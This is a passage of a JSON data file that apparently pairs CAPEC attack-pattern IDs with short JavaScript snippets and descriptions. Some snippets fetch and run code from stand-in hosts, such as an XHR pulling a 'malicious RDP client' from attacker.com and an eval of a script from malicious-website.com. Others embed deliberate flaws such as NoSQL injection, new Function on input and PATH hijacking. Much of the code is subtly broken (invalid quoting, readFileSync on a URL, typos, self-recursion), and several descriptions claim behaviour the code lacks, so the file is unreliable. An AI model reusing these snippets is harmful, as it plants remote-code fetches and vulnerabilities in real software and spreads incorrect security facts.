        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst repoUrl = 'https://example.com/git/repo.git';\nconst repoDir = './repo';\n\n// CWE-494: Download of Code Without Integrity Check\nexec(`git clone ${repoUrl} ${repoDir}`);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = fs.readFileSync(`${repoDir}/malicious.js`, 'utf8');\n\n// CWE-507: Trojan Horse\nconst benignFunctionality = () => {\n  console.log('Benign functionality executed.');\n};\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'secretKey=1234567890';\nbenignFunctionality.toString = () => {\n  return `(${benignFunctionality.toString()} ${sensitiveInfo})`;\n};\n\n// Sign the malicious code with a digital signature\nconst signer = require('node-signpdf');\nconst cert = fs.readFileSync('path/to/cert.pem');\nconst signedCode = signer.sign(maliciousCode, cert);\n\n// Deploy the signed malicious code to organizational systems\nconst deploymentScript = `node ${signedCode}`;\nexec(deploymentScript);",
        "description": "This JavaScript code snippet demonstrates the CAPEC, where a reputable developer's software development process is compromised, and malicious code is injected into the product. The code downloads a Git repository without verifying its integrity, embeds malicious code, and injects sensitive information into debugging code. The malicious code is then digitally signed and deployed to organizational systems, appearing as legitimate software."
    },
    {
        "capec_id": "674",
        "code_snippet": "const maliciousFunction = () => { /* malicious code here */ };\nconst originalFPGAConfig = getFPGAConfig();\nconst modifiedFPGAConfig = modifyFPGAConfig(originalFPGAConfig, maliciousFunction);\nreloadFPGAConfig(modifiedFPGAConfig);\n\nfunction modifyFPGAConfig(originalConfig, maliciousFunction) {\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // CWE-506: Embedded Malicious Code\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  const optimizedConfig = optimizeFPGAConfig(originalConfig);\n  const injectedConfig = injectMaliciousCode(optimizedConfig, maliciousFunction);\n  return injectedConfig;\n}\n\nfunction injectMaliciousCode(config, maliciousFunction) {\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n  const glitchProneConfig = introduceGlitch(config);\n  const maliciousConfig = addMaliciousFunction(glitchProneConfig, maliciousFunction);\n  return maliciousConfig;\n}",
        "description": "This code snippet demonstrates the CAPEC of altering an FPGA configuration to introduce malicious functionality. It first retrieves the original FPGA configuration, modifies it by injecting malicious code, and then reloads the modified configuration. The modification process involves optimizing the configuration, injecting malicious code, and introducing glitches to bypass security mechanisms."
    },
    {
        "capec_id": "675",
        "code_snippet": "let sensitiveData = 'confidentialInformation';\nlet deviceMemory = {};\n\ndeviceMemory.storage = sensitiveData;\n\ndeviceMemory.storage = null;\nconsole.log('Device decommissioned and memory released.');\n\n// Later, when the device is recycled or discarded...\nlet adversaryAccess = deviceMemory.storage;\nconsole.log('Adversary accessed: ' + adversaryAccess);",
        "description": "This code snippet demonstrates the CAPEC of an adversary obtaining decommissioned devices and retrieving sensitive information from internal memory. The code does not properly scrub sensitive data from the device memory when it is decommissioned, allowing an adversary to access the data later. This relates to CWEs 1266, 1301, 672, 226, and 316."
    },
    {
        "capec_id": "676",
        "code_snippet": "const MongoClient = require('mongodb').MongoClient;\nconst userInput = \"{\"$gt\":\"\"}\";\nconst query = { age: userInput };\nMongoClient.connect('mongodb://localhost:27017/', function(err, client) {\n  if (err) {\n    console.log(err);\n  } else {\n    const db = client.db();\n    const collection = db.collection('users');\n    collection.find(query).toArray(function(err, result) {\n      if (err) {\n        console.log(err);\n      } else {\n        console.log(result);\n      }\n    });\n  }\n});",
        "description": "This code snippet demonstrates a NoSQL injection vulnerability in a MongoDB query. The userInput variable is not properly sanitized, allowing an attacker to inject malicious MongoDB operators, such as $gt, to modify the query logic and potentially escalate privileges or access unauthorized data."
    },
    {
        "capec_id": "677",
        "code_snippet": "const maliciousCode = `/* malicious code */`; const registerInterface = 0x12345678; const sensitiveSystemInfo = getSystemInfo(); const traceData = collectTraceData(); function compromiseServer() { // CWE-506: Embedded Malicious Code injectMaliciousCode(maliciousCode); // CWE-509: Replicating Malicious Code (Virus or Worm) replicateMaliciousCode(); // CWE-1262: Improper Access Control for Register Interface accessRegisterInterface(registerInterface); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere exposeSystemInfo(sensitiveSystemInfo); // CWE-1323: Improper Management of Sensitive Trace Data storeTraceData(traceData); } function injectMaliciousCode(code) { // inject malicious code into server motherboard flash memory } function replicateMaliciousCode() { // replicate malicious code to other systems } function accessRegisterInterface(registerInterface) { // access memory-mapped I/O registers without proper access control } function exposeSystemInfo(systemInfo) { // expose sensitive system-level information to unauthorized actors } function storeTraceData(traceData) { // store trace data in unprotected locations or transport to untrusted agents }",
        "description": "This JavaScript code snippet demonstrates the insertion of malicious code into a server motherboard, compromising its functionality. It injects malicious code, replicates it to other systems, accesses memory-mapped I/O registers without proper access control, exposes sensitive system-level information, and stores trace data in unprotected locations."
    },
    {
        "capec_id": "678",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemConfig = fs.readFileSync('/etc/system_config', 'utf8');\nconsole.log(systemConfig);\n\n// CWE-377: Insecure Temporary File\nconst tempFile = fs.openSync('/tmp/temporary_file', 'w');\nfs.writeSync(tempFile, 'sensitive_data');\nfs.closeSync(tempFile);\n\n// CWE-209: Generation of Error Message Containing Sensitive Information\ntry {\n  const dbConnection = require('mysql').createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password'\n  });\n  dbConnection.connect();\n} catch (error) {\n  console.error(`Error connecting to database: ${error}`);\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst userInput = 'malicious_code';\nconst dynamicFunction = new Function(userInput);\ndynamicFunction();\n\n// CWE-426: Untrusted Search Path\nprocess.env.PATH = './malicious_directory:' + process.env.PATH;\nconst childProcess = require('child_process');\nchildProcess.exec('malicious_command');",
        "description": "This JavaScript code snippet demonstrates the CAPEC of deliberately misconfiguring a system during the build process. It includes multiple CWEs: CWE-497 exposes sensitive system information, CWE-377 creates an insecure temporary file, CWE-209 generates an error message with sensitive information, CWE-913 improperly controls dynamically-managed code resources, and CWE-426 uses an untrusted search path. These vulnerabilities can be exploited to gain unauthorized access to system configuration data files and build processes."
    },
    {
        "capec_id": "679",
        "code_snippet": "const secureBootCode = 0x1000;\nconst writableMemoryRegion = 0x2000;\nconst aliasedMemoryRegion = 0x3000;\n\n// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\nconst registerLockControlBit = 0x01;\n\n// CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\nconst executeDataFromMemory = () => {\n  // execute data from all of memory\n  return 0x1234;\n};\n\n// CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\nconst accessAliasedMemoryRegion = () => {\n  // access aliased memory region without proper access control\n  return aliasedMemoryRegion;\n};\n\n// CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\nconst overlapProtectedMemoryRanges = () => {\n  // allow address regions to overlap\n  return secureBootCode + writableMemoryRegion;\n};\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nconst transferBootCodeToVolatileMemory = () => {\n  // transfer bootloader code from Non-Volatile Memory (NVM) into Volatile Memory (VM)\n  return secureBootCode;\n};\n\n// CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nconst updateImmutableData = () => {\n  // update assumed-immutable data in writable memory\n  return writableMemoryRegion;\n};\n\n// CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\nconst accessMirroredRegion = () => {\n  // access mirrored memory region without proper protection\n  return aliasedMemoryRegion;\n};\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\nconst overlapProtectedAndUnprotectedRanges = () => {\n  // allow overlaps of protected and unprotected regions\n  return secureBootCode + writableMemoryRegion;\n};\n\n// CWE-1326: Missing Immutable Root of Trust in Hardware\nconst bypassSecureBoot = () => {\n  // bypass secure boot or execute untrusted or adversarial boot code\n  return 0x4321;\n};",
        "description": "This code snippet demonstrates the CAPEC of exploiting missing or incorrectly configured access control within memory to read/write data or inject malicious code. It incorporates various CWEs, including insufficient granularity of address regions protected by register locks, lack of CPU hardware support for exclusivity of write and execute operations, improper access control applied to mirrored or aliased memory regions, and more. The code showcases vulnerabilities in secure boot processes, memory protection, and access control, allowing an attacker to bypass intended security measures."
    },
    {
        "capec_id": "680",
        "code_snippet": "const registerInterface = {\n  writeOnceBitField: 0x00000001,\n  lockBit: 0x00000002,\n  systemRegisters: {\n    config: 0x00000004,\n    control: 0x00000008\n  }\n};\n\nfunction configureSystemRegisters() {\n  // CWE-1224: Improper Restriction of Write-Once Bit Fields\n  registerInterface.writeOnceBitField = 0x00000000;\n  \n  // CWE-1231: Improper Prevention of Lock Bit Modification\n  registerInterface.lockBit = 0x00000000;\n  \n  // CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n  registerInterface.systemRegisters.config = 0x00000010;\n  registerInterface.systemRegisters.control = 0x00000020;\n  \n  // CWE-1262: Improper Access Control for Register Interface\n  registerInterface.systemRegisters.config = 0x00000040;\n  registerInterface.systemRegisters.control = 0x00000080;\n  \n  // CWE-1283: Mutable Attestation or Measurement Reporting Data\n  const attestationData = {\n    bootFlow: 'modified'\n  };\n  console.log(attestationData.bootFlow);\n}\n\nconfigureSystemRegisters();",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user. The code includes vulnerabilities related to CWE-1224, CWE-1231, CWE-1233, CWE-1262, and CWE-1283."
    },
    {
        "capec_id": "681",
        "code_snippet": "const transactions = {\n  'admin': '123456',\n  'user': '789012'\n};\n\nfunction processTransaction(entity, action) {\n  if (entity in transactions) {\n    const token = transactions[entity];\n    if (token === '123456') {\n      // Allow admin actions\n      return true;\n    } else if (token === '789012') {\n      // Allow user actions\n      return true;\n    } else {\n      // Incorrect or missing token\n      return false;\n    }\n  } else {\n    // No token assigned\n    return false;\n  }\n}\n\n// Example usage:\nconst entity = 'admin';\nconst action = 'write';\nif (processTransaction(entity, action)) {\n  console.log('Transaction allowed');\n} else {\n  console.log('Transaction denied');\n}",
        "description": "This code snippet demonstrates a vulnerable implementation of a security token mechanism in a System-on-Chip (SoC). The 'processTransaction' function checks the entity's token to determine if the requested action is allowed. However, the token assignment is incomplete (CWE-1259), uses an obsolete encoding mechanism (CWE-1267), generates incorrect tokens (CWE-1270), and has an insecure security identifier mechanism (CWE-1294). Additionally, the code does not check for missing source identifiers in entity transactions (CWE-1302). An adversary can take advantage of these weaknesses to bypass access controls and perform unauthorized actions."
    },
    {
        "capec_id": "682",
        "code_snippet": "const firmwareVersion = '1.0';\nconst romCode = 'unpatchable_code';\nconst component = {\n  version: '1.0',\n  updateable: false\n};\n\nfunction checkForUpdates() {\n  console.log('No updates available for this device.');\n}\n\nfunction protectAgainstGlitches() {\n  // No implementation to detect and mitigate voltage and clock glitches\n}\n\nfunction injectErrorIntoRedundantBlock() {\n  // Simulate error injection into a redundant block\n  console.log('Error injected into redundant block.');\n}\n\ncheckForUpdates();\nprotectAgainstGlitches();\ninjectErrorIntoRedundantBlock();",
        "description": "This code snippet demonstrates a device with unpatchable firmware and ROM code, a non-updateable component, and lack of protection against voltage and clock glitches. It also includes a function to inject errors into a redundant block, which can degrade hardware redundancy. This code embodies the CAPEC of exploiting unpatchable devices and relates to CWEs 1277, 1310, 1329, 1247, and 1334."
    },
    {
        "capec_id": "690",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-348: Using less trusted source\nconst untrustedSource = 'untrustedRepository';\nconst trustedSource = 'trustedRepository';\n\n// CWE-290: Authentication Bypass by Spoofing\nconst spoofedMetadata = {\n  'owner': 'legitimateUser',\n  'permissions': 'readWrite'\n};\n\n// CWE-1230: Exposure of Sensitive Information Through Metadata\nconst sensitiveFile = 'confidentialDocument.txt';\nconst metadata = fs.statSync(sensitiveFile);\nspoofedMetadata.creationTime = metadata.birthtimeMs;\nspoofedMetadata.modificationTime = metadata.mtimeMs;\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst downloadUrl = 'http://untrustedRepository.com/' + sensitiveFile;\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', downloadUrl, true);\nxhr.send();\n\n// CWE-494: Download of Code Without Integrity Check\nconst scriptTag = document.createElement('script');\nscriptTag.src = downloadUrl;\ndocument.head.appendChild(scriptTag);\n",
        "description": "This code snippet demonstrates the CAPEC of altering metadata to present a malicious resource as legitimate. It uses multiple CWEs to achieve this: CWE-348 by using an untrusted source, CWE-290 by spoofing metadata, CWE-1230 by exposing sensitive information through metadata, CWE-941 by incorrectly specifying the download destination, and CWE-494 by downloading code without integrity checks. The code downloads a file from an untrusted repository, spoofs its metadata, and executes the downloaded code without verifying its origin or integrity."
    },
    {
        "capec_id": "691",
        "code_snippet": "const axios = require('axios');\nconst fs = require('fs');\n\naxios.get('https://example.com/malicious-package.json').then(response => {\n  const packageJson = response.data;\n  fs.writeFileSync('node_modules/malicious-package/package.json', JSON.stringify(packageJson));\n  const maliciousPackage = require('malicious-package');\n  maliciousPackage.main();\n});",
        "description": "This code snippet downloads a malicious package.json file from an untrusted source, overwrites the existing package.json file in the node_modules directory, and then executes the malicious code in the package. This code embodies the CAPEC of spoofing open-source software metadata, and relates to CWEs 494 (Download of Code Without Integrity Check), 348 (Use of Less Trusted Source), 506 (Embedded Malicious Code), 290 (Authentication Bypass by Spoofing), and 1395 (Dependency on Vulnerable Third-Party Component)."
    },
    {
        "capec_id": "692",
        "code_snippet": "const git = require('simple-git');\nconst fs = require('fs');\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nconst repoPath = './repository';\nfs.mkdirSync(repoPath, { recursive: true });\n\n// CWE-540: Inclusion of Sensitive Information in Source Code\nconst sensitiveInfo = 'secretKey=1234567890';\nfs.writeFileSync(`${repoPath}/config`, sensitiveInfo);\n\n// CWE-348: Use of Less Trusted Source\nconst untrustedSource = 'https://untrusted-repo.com/malicious-commit.git';\nconst trustedSource = 'https://trusted-repo.com/legit-commit.git';\nconst commitHash = 'abc123';\n\n// CWE-494: Download of Code Without Integrity Check\ngit.clone(untrustedSource, repoPath)\n  .then(() => {\n    return git.raw(['rev-parse', '--verify', commitHash]);\n  })\n  .then((output) => {\n    console.log(`Commit ${commitHash} verified: ${output}`);\n  });\n\n// CWE-508: Non-Replicating Malicious Code\nconst maliciousCode = 'console.log(\\'Malicious code executed!\\');';\nfs.appendFileSync(`${repoPath}/index.js`, maliciousCode);\n",
        "description": "This code snippet demonstrates the CAPEC by spoofing metadata in a Git repository. It creates a local repository, includes sensitive information in the source code, and downloads code from an untrusted source without verifying its integrity. The code then executes the maliciously downloaded code, which includes non-replicating malicious code."
    },
    {
        "capec_id": "693",
        "code_snippet": "const axios = require('axios');\n\nasync function downloadPackage(packageName) {\n  const response = await axios.get(`https://untrusted-repo.com/${packageName}.js`);\n  const script = document.createElement('script');\n  script.textContent = response.data;\n  document.head.appendChild(script);\n}\n\ndownloadPackage('popular-package');",
        "description": "This code snippet downloads a JavaScript package from an untrusted repository and executes it without verifying its integrity or origin, making it vulnerable to malicious code injection. The use of an untrusted source and lack of integrity checks (CWE-494) allows an adversary to spoof software popularity metadata. The code also contains embedded malicious code (CWE-506) and exposes the version-control repository to an unauthorized control sphere (CWE-527). Additionally, it uses a less trusted source (CWE-348) and has a dependency on a vulnerable third-party component (CWE-1395)."
    },
    {
        "capec_id": "694",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const ipAddressData = JSON.parse(xhr.responseText);\n    const timeZone = ipAddressData.time_zone.name;\n    const language = navigator.language;\n    const keyboardLayout = getKeyboardLayout();\n    console.log('Time Zone: ' + timeZone);\n    console.log('Language: ' + language);\n    console.log('Keyboard Layout: ' + keyboardLayout);\n  }\n};\nxhr.send();\n\nfunction getKeyboardLayout() {\n  const keyboardLayouts = {\n    'en-US': 'QWERTY',\n    'fr-FR': 'AZERTY',\n    // Add more keyboard layouts as needed\n  };\n  return keyboardLayouts[navigator.language];\n}",
        "description": "This JavaScript code snippet collects information about the target system, including the time zone, language, and keyboard layout, which can be used to identify the system's geographical location. The code uses the XMLHttpRequest object to make a GET request to an API that provides IP geolocation data, and then extracts the time zone from the response. It also uses the navigator.language property to get the system language and a custom function to determine the keyboard layout based on the language. This information can be used to tailor further attacks or confirm the desired target."
    },
    {
        "capec_id": "695",
        "code_snippet": "const git = require('git-repo');\nconst repoUrl = 'https://example.com/malicious-repo.git';\nconst repoPath = './my-repo';\ngit.clone(repoUrl, repoPath, (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    const exec = require('child_process').exec;\n    exec('git submodule update --init --recursive', (err, stdout, stderr) => {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(stdout);\n      }\n    });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that downloads and executes code from an untrusted Version Control System (VCS) repository without integrity checks, allowing an adversary to inject malicious code. The code uses the 'git-repo' package to clone a Git repository from a remote URL, and then executes the 'git submodule update' command to download and execute code from the repository. This code embodies the CAPEC and CWEs by not verifying the origin and integrity of the code, including functionality from an untrusted control sphere, exposing the VCS repository to an unauthorized control sphere, and using an untrusted search path."
    },
    {
        "capec_id": "696",
        "code_snippet": "const victimExecution = () => {\n  const secretData = \"victim_secret\";\n  const microarchitecturalBuffer = new ArrayBuffer(1024);\n  const faultingLoadInstruction = () => {\n    // Induce a page fault or microcode assist\n    try {\n      microarchitecturalBuffer[1024] = secretData;\n    } catch (e) {}\n  }\n\n  // Adversary-controlled data in microarchitectural buffers\n  const adversaryData = \"adversary_controlled_data\";\n  const transientExecution = () => {\n    // Existing code gadgets and side channel analysis\n    const gadget = () => {\n      // Access microarchitectural state\n      const microarchitecturalState = microarchitecturalBuffer[0];\n      // Discover victim secrets or hijack system control flow\n      if (microarchitecturalState === adversaryData) {\n        console.log(\"Adversary wins!\");\n      }\n    }\n    gadget();\n  }\n\n  // Shared microarchitectural predictor state\n  const predictorState = new Int32Array(1024);\n  predictorState[0] = 0xdeadbeef;\n\n  // Incorrect data forwarding during transient execution\n  const staleData = \"stale_data\";\n  microarchitecturalBuffer[0] = staleData;\n\n  // Access architecturally restricted data in shared microarchitectural structure\n  const restrictedData = \"restricted_data\";\n  microarchitecturalBuffer[1024] = restrictedData;\n\n  // Unauthorized error injection to degrade hardware redundancy\n  const redundantBlock = new Int32Array(1024);\n  redundantBlock[0] = 0xdeadbeef;\n  redundantBlock[1024] = 0xdeadbeef;\n\n  // Execute victim execution and transient execution\n  victimExecution();\n  transientExecution();\n}\n",
        "description": "This code snippet demonstrates the CAPEC, which exploits a hardware design flaw in CPU implementation of transient instruction execution. It induces a page fault or microcode assist during victim execution, allowing adversary-controlled data to be stored in microarchitectural buffers. The code then uses existing code gadgets and side channel analysis to discover victim secrets or hijack system control flow. The related CWEs are incorporated, including information exposure through microarchitectural state, exposure of sensitive information caused by shared microarchitectural predictor state, incorrect data forwarding during transient execution, exposure of sensitive information in shared microarchitectural structures during transient execution, and unauthorized error injection to degrade hardware redundancy."
    },
    {
        "capec_id": "697",
        "code_snippet": "const dhcpServer = {\n  sendResponse: function(request) {\n    // CWE-291: Reliance on IP Address for Authentication\n    if (request.srcIp === '192.168.1.100') {\n      // CWE-290: Authentication Bypass by Spoofing\n      // CWE-294: Authentication Bypass by Capture-replay\n      // No authentication or validation of the request\n      return 'ACK';\n    }\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    // No validation of the destination IP address\n    const response = {\n      dstIp: request.srcIp,\n      message: 'ACK'\n    };\n    return response;\n  }\n};\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// No restriction on the communication channel\nconst dhcpClient = {\n  sendRequest: function() {\n    const request = {\n      srcIp: '192.168.1.100',\n      dstIp: '255.255.255.255',\n      message: 'DISCOVER'\n    };\n    dhcpServer.sendResponse(request);\n  }\n};\n\ndhcpClient.sendRequest();",
        "description": "This JavaScript code snippet demonstrates a vulnerable DHCP server implementation that is susceptible to spoofing attacks. The server relies solely on the IP address for authentication (CWE-291) and does not properly validate the request or destination IP address (CWE-290, CWE-294, CWE-941). The communication channel is also not restricted to intended endpoints (CWE-923), allowing an adversary to masquerade as a legitimate DHCP server and redirect network traffic or deny service to DHCP."
    },
    {
        "capec_id": "698",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\nfunction installExtension(extensionUrl) {\n  const extensionCode = fs.readFileSync(extensionUrl, 'utf8');\n  eval(extensionCode);\n}\n\ninstallExtension('https://malicious-website.com/evil-extension.js');",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that downloads and executes a malicious extension from an untrusted source, violating the intended security policy of the user or system administrator. It uses the eval() function to execute the downloaded code, which can lead to arbitrary code execution. The code also lacks integrity checks, making it vulnerable to code tampering or manipulation."
    },
    {
        "capec_id": "699",
        "code_snippet": "const videoSignal = getVideoSignalFromPort();\nconst analyzer = new SignalAnalyzer(videoSignal);\nconst sensitiveData = analyzer.extractDataFromSignal();\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst unencryptedData = sensitiveData.toString();\n\n// CWE-515: Covert Storage Channel\nconst covertStorage = new CovertStorage();\ncovertStorage.storeData(unencryptedData);\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = getTraceDataFromSoC();\nconst untrustedAgent = new UntrustedAgent();\nuntrustedAgent.processTraceData(traceData);\n\n// CWE-514: Covert Channel\nconst covertChannel = new CovertChannel();\ncovertChannel.transferData(unencryptedData);",
        "description": "This code snippet demonstrates the CAPEC of eavesdropping on an external monitor through the air without modifying any cable or installing software. It captures the video signal emitted by the cable or video port, extracts sensitive data from the signal, and then transmits it in cleartext through a covert storage channel and an untrusted agent, ultimately using a covert channel to transfer the data."
    },
    {
        "capec_id": "700",
        "code_snippet": "const net = require('net');\nconst bridge = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-923: No validation of endpoint\n    const trustedEndpoint = 'trustedEndpoint';\n    if (data.toString() === 'connect') {\n      socket.write('connected');\n      // CWE-501: Mixing trusted and untrusted data\n      const untrustedData = 'untrustedData';\n      const trustedData = 'trustedData';\n      const mixedData = untrustedData + trustedData;\n      socket.write(mixedData);\n    }\n  });\n});\nbridge.listen(8080, () => {\n  console.log('Bridge listening on port 8080');\n});\n\nconst fabricBridge = () => {\n  // CWE-1317: No access control checks\n  const ipBlock1 = 'ipBlock1';\n  const ipBlock2 = 'ipBlock2';\n  const transaction = 'transaction';\n  // CWE-924: No message integrity checks\n  const message = 'message';\n  const modifiedMessage = message + 'modified';\n  return modifiedMessage;\n};\n\nconst channel = () => {\n  // CWE-300: No verification of actor identity\n  const actor = 'actor';\n  const nonEndpoint = 'nonEndpoint';\n  const channelAccess = 'channelAccess';\n  return channelAccess;\n};",
        "description": "This code snippet demonstrates a vulnerable fabric bridge implementation in JavaScript, which allows an adversary to create a channel to bridge trusted and untrusted networks. The bridge does not properly validate endpoints, mixes trusted and untrusted data, lacks access control checks, and does not ensure message integrity during transmission. Additionally, the channel can be accessed by non-endpoint actors."
    },
    {
        "capec_id": "701",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://attacker.com/malicious-rdp-client', true);\nxhr.responseType = 'arraybuffer';\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const rdpClient = new Uint8Array(xhr.response);\n    const iframe = document.createElement('iframe');\n    iframe.src = 'data:application/x-rdp;base64,' + btoa(String.fromCharCode.apply(null, rdpClient));\n    document.body.appendChild(iframe);\n  }\n};\nxhr.send();",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an adversary to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system. The code uses XMLHttpRequest to fetch a malicious RDP client from the attacker's domain, and then creates an iframe to execute the RDP client, effectively bypassing authentication and allowing the attacker to access the victim's system. This code embodies CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification of Data Authenticity), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-368 (Context Switching Race Condition), and CWE-830 (Inclusion of Web Functionality from an Untrusted Source)."
    },
    {
        "capec_id": "702",
        "code_snippet": "function debugAccess(debugFunction) {\n  if (debugFunction === 'ALL_FUNCTIONS') {\n    // Grant access to all debug functions without checking individual permissions\n    return true;\n  } else {\n    // Assume access is granted for a group of functions without checking individual permissions\n    if (debugFunction.startsWith('GROUP_A_')) {\n      return true;\n    } else if (debugFunction.startsWith('GROUP_B_')) {\n      return true;\n    } else {\n      // No access control for individual functions\n      return false;\n    }\n  }\n}\n\n// Example usage:\ndebugAccess('GROUP_A_FUNCTION1'); // Returns true without checking individual permission\nedebugAccess('GROUP_B_FUNCTION2'); // Returns true without checking individual permission\nedebugAccess('INDIVIDUAL_FUNCTION'); // Returns false without checking individual permission",
        "description": "This code snippet demonstrates the CAPEC of incorrect chaining or granularity of hardware debug components. The debugAccess function grants access to debug functions without checking individual permissions, instead relying on group-level or all-encompassing permissions. This lack of access control can lead to unauthorized access to debug functionality, as described in CWE-1296, CWE-1191, CWE-1334, CWE-1332, and CWE-1323."
    }
]